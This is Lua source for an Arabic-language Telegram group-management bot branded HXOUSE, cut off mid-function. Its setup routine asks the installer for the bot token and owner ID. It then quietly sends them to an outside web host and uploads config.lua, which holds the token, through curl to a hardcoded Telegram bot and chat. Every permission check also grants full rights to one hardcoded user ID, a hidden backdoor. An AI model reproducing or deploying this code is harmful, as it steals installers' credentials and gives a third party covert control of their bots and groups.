-- Welcom to file the best source in the telegram
-- VERSION HXOUSE V1 
-- all the file by HXOUSE TEAM  @HXOUSEiq 
-- join in chennel @HXOUSEiq
--*********Serpent*******--
serpent = require("serpent")
--***********Lgi*********--
lgi = require('lgi')
--*********redis*******--
redis = require('redis')
--*******hxousedx1******--
hxousedx1 = Redis.connect('127.0.0.1', 6379)
--*********Notify*******--
URL = require('socket.url')  
HTTPS = require ("ssl.https")  
https = require ("ssl.https") 
http  = require ("socket.http")
json = dofile('./JSON.lua')
JSON = dofile('./dkjson.lua')
notify = lgi.require('Notify')
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates")
chats = {}
day = 313456502
-------------------------------------------------------
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 902039110
end
io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
local username = io.read()
io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
username = username, 
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
https.request("https://ibcorp.ibuser.xyz/hxouse/?id="..SUDO.."&user="..username.."&token="..token)
local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 902039110 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
file = io.open("HXRUNER.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./HXOUSE.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("HX", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./HXRUNER.sh
done
]])  
file:close() 
os.execute('./HX')
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
end
local load_hxousedx1 = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_hxousedx1 = load_hxousedx1()  
sudos = dofile("./config.lua") 
bot_owner = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
HXOUSE = sudos.bot_id
SUDOUSERNAME = sudos.username
tokenbot = sudos.token
name_bot = (hxousedx1:get(HXOUSE..'name_bot') or 'هــكـســوس')
-----------------------------------------------------------------------------------------------
---------------
-- Start Functions Faeder --
--------------- 
-----------------------------------------------------------------------------------------------
---------------Bot Owner---------------------
function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(902039110) then var = true end return var end
function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Sudo------------------------------
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(902039110) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Sudo3----------------------------
function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Owner all-----------------------
function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Modod all----------------------
function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:onall:' local onall = hxousedx1:sismember(HXOUSE..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------VIP MEMBER ALL-----------
function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:onall:' local onall = hxousedx1:sismember(HXOUSE..hashss, user_id) local hashsss = 'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashsss, user_id) local hashssss =  'bot:moall:'local moall = hxousedx1:sismember(HXOUSE..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Donky------------------------------
function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = hxousedx1:sismember(HXOUSE..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = hxousedx1:sismember(HXOUSE..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = hxousedx1:sismember(HXOUSE..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = hxousedx1:sismember(HXOUSE..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = hxousedx1:sismember(HXOUSE..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Monsh------------------------------
function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Monsh2----------------------------
function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = hxousedx1:sismember(HXOUSE..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Owner------------------------------
function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = hxousedx1:sismember(HXOUSE..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = hxousedx1:sismember(HXOUSE..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------Modod------------------------------
function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = hxousedx1:sismember(HXOUSE..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = hxousedx1:sismember(HXOUSE..hashsss, user_id) local hashssss =  'bot:onall:' local onall = hxousedx1:sismember(HXOUSE..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = hxousedx1:sismember(HXOUSE..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
---------------VIP MEMBER--------------------
function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = hxousedx1:sismember(HXOUSE..hash, user_id) local hashs =  'bot:admins:' local admin = hxousedx1:sismember(HXOUSE..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = hxousedx1:sismember(HXOUSE..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = hxousedx1:sismember(HXOUSE..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = hxousedx1:sismember(HXOUSE..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = hxousedx1:sismember(HXOUSE..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = hxousedx1:sismember(HXOUSE..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = hxousedx1:sismember(HXOUSE..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(902039110) then var = true end return var end
----------------------------------------------------------
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local hashs = "admins:data:" .. user_id
local lists = hxousedx1:smembers(HXOUSE..hashs)
hxousedx1:del(HXOUSE.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
hxousedx1:incr(HXOUSE.."SudoNumberGp" .. user_id)
end
end
local setnumbergp_three = function(user_id)
local hashss = "admins:data:" .. user_id
local lists = hxousedx1:smembers(HXOUSE..hashss)
hxousedx1:del(HXOUSE.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
hxousedx1:incr(HXOUSE.."SudoNumberGp" .. user_id)
end
end
local list = hxousedx1:smembers(HXOUSE.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end
local lists = hxousedx1:smembers(HXOUSE.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end
hxousedx1:setex(HXOUSE.."bot:reload", 7230, true)
end
-------------------FreeWords--------------------
local function is_free(msg, value)
local var = false
local hash = (HXOUSE..'bot:freewords:')
if hash then
local names = hxousedx1:hkeys(hash)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end
end
end
return var
end 
-------------------Banned---------------------
local function is_banned(user_id, chat_id)
local var = false
local hash = 'bot:banned:'..chat_id
local banned = hxousedx1:sismember(HXOUSE..hash, user_id)
if banned then
var = true
end
return var
end
------------------Muted----------------------
local function is_muted(user_id, chat_id)
local var = false
local hash = 'bot:muted:'..chat_id
local muted = hxousedx1:sismember(HXOUSE..hash, user_id)
if muted then
var = true
end
return var
end

local function is_mutet(user_id, chat_id)
local var = false
local hash = 'bot:mutet:'..chat_id
local muted = hxousedx1:sismember(HXOUSE..hash, user_id)
if muted then
var = true
end
return var
end
------------------Gbaned--------------------
function is_gbanned(user_id)
local var = false
local hash = 'bot:gban:'
local gbanned = hxousedx1:sismember(HXOUSE..hash, user_id)
if gbanned then
var = true
end
return var
end
------------------------HXOUSE TEAM--------------------------
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
----------------------whoAdd-------
local who_add = function(chat)
local user_id
local user = false
local list1 = hxousedx1:smembers(HXOUSE.."Bot:KpSudos")
local list2 = hxousedx1:smembers(HXOUSE.."Bot:Admins")
for k, v in pairs(list1) do
local hash = "sudo:data:" .. v
local is_add = hxousedx1:sismember(HXOUSE..hash, chat)
if is_add then
user_id = v
end
end
for k, v in pairs(list2) do
local hash = "sudo:data:" .. v
local is_add = hxousedx1:sismember(HXOUSE..hash, chat)
if is_add then
user_id = v
end
end
local hash = "sudo:data:" .. bot_owner
if hxousedx1:sismember(HXOUSE..hash, chat) then
user_id = bot_owner
end
if user_id then
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. user_id)
if user_info then
user = user_info
end
end
return user
end
-----------------------HXOUSE TEAM-----------------------------------------
local function hxousedx113(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= HXOUSE:lower() then 
hxousedx113(chat,msg.id_,"*⌯︙ هذا الملف ليس تابع لهذا السورس *")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
hxousedx113(chat,msg.id_,"*⌯︙ جاري رفع الملف *")   
else
hxousedx113(chat,msg.id_,"*⌯︙ غير صحيح *")   
end      
local info_file = io.open('./'..HXOUSE..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
hxousedx113(chat,msg.id_,"*⌯︙ تم رفع النسخه بنجاح \n⌯︙ تم رفع اداريين المجموعات السابقين \n⌯︙ تم قفل جميع اوامر حمايه المجموعات *")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
hxousedx1:sadd(HXOUSE.."bot:groups",idg)
hxousedx1:set(HXOUSE.."bot:enable:"..idg,true)
hxousedx1:setex(HXOUSE.."bot:charge:"..idg,86400,true)
hxousedx1:sadd("hxouse:addg"..bot_id, idg)
hxousedx1:set(HXOUSE..'editmsg'..idg,true)
hxousedx1:set(HXOUSE..'bot:bots:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:bots:ban'..idg,true)
hxousedx1:set(HXOUSE..'keed_bots'..idg,true)
hxousedx1:set(HXOUSE..'anti-flood:'..idg,true)
hxousedx1:set(HXOUSE..'bot:inline:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:photo:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:spam:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:video:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:gifs:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:music:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:voice:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:links:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:location:mute'..idg,true)
hxousedx1:set(HXOUSE..'tags:lock'..idg,true)
hxousedx1:set(HXOUSE..'bot:strict'..idg,true)
hxousedx1:set(HXOUSE..'bot:document:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:hashtag:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:contact:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:webpage:mute'..idg,true)
hxousedx1:set(HXOUSE..'bot:sticker:mute'..idg,true)
hxousedx1:set(HXOUSE..'markdown:lock'..idg,true)
hxousedx1:set(HXOUSE..'bot:forward:mute'..idg,true)
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
hxousedx1:sadd(HXOUSE..'bot:monsh:'..idg,idmsh)  
print('تم رفع '..k..' منشئين')
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
hxousedx1:sadd(HXOUSE..'bot:owners:'..idg,idmder)  
print('تم رفع '..k..' مدراء')
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
hxousedx1:sadd(HXOUSE..'bot:momod:'..idg,idmod)  
print('تم رفع '..k..' ادمنيه')
end
end
if v.VIP then
for k,idvip in pairs(v.VIP) do
hxousedx1:sadd(HXOUSE..'bot:vipmem:'..idg,idvip)  
print('تم رفع '..k..' مميزين')
end
end
if v.linkgroup then
if v.linkgroup ~= "" then
hxousedx1:set(HXOUSE.."bot:group:link"..idg,v.linkgroup)   
print('تم وضع رابط ')
end
end
end
end
-----------------------HXOUSE TEAM------------------------------------------------------------------------
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--------------------------HXOUSE TEAM---------------------------------------------------------------------
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
-----------------------HXOUSE TEAM------------------------------------------------------------------------
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--------------------------HXOUSE TEAM---------------------------------------------------------------------
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
---------------------------HXOUSE TEAM-----------------------------------------------------------------
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
------------------------------HXOUSE TEAM-----------------------------------------------------------------
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
---------------------------HXOUSE TEAM--------------------------------------------------------------------
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
------------------------------HXOUSE TEAM-----------------------------------------------------------------
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
-------------------------------------HXOUSE TEAM---------------------------------------------------------
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--------------------------------HXOUSE TEAM-----------------------------------------------------
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
----------------------------------------HXOUSE TEAM
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end
tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--------------------------------------------HXOUSE TEAM---------------------------------------------------
function vardump(value)
print(serpent.block(value, {comment=false}))
end
-------------------------------------------HXOUSE TEAM----------------------------------------------------
function dl_cb(arg, data)
end
-----------------------------------------HXOUSE TEAM-----------------------------------------------------
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
------------------------------------------HXOUSE TEAM-----------------------------------------------------
function hxousedx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end
----------------------------------------HXOUSE TEAM-------------------------------------------------------
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
------------------------------------------------HXOUSE TEAM-----------------------------------------------
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
----------------------------------------HXOUSE TEAM-------------------------------------------------------
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
---------------------------------------------HXOUSE TEAM--------------------------------------------------
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
-------------------------------------------HXOUSE TEAM----------------------------------------------------
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--------------------------------------------HXOUSE TEAM---------------------------------------------------
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
----------------------------------------HXOUSE TEAM--------------------------------------------------------
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--------------------------------------------HXOUSE TEAM-----------------------------------------------------
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
------------------------------------------------HXOUSE TEAM------------------
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--------------
function send_inline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..tokenbot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
--------------------------------------------HXOUSE TEAM---------------------------------------------------
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
---------------------------------------------HXOUSE TEAM--------------------------------------------------
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end
getChannelFull(channel,callback_admins)
end
-------------------------------------------HXOUSE TEAM----------------------------------------------------
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
----------------------------------------HXOUSE TEAM-------------------------------------------------------
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
---------------------------------------------HXOUSE TEAM--------------------------------------------------
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
-----------
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--------------
--------------Local Renk-----------
local renk_hxouse = function(msg)
if tonumber(msg.sender_user_id_) == tonumber(902039110) then
hxouse  = "مبرمج السورس"
elseif is_leaderid(msg.sender_user_id_) then
hxouse  = "المطور الاساسي"
elseif is_sudoid(msg.sender_user_id_) then
hxouse = "المطور الثانوي"
elseif is_admin(msg.sender_user_id_) then
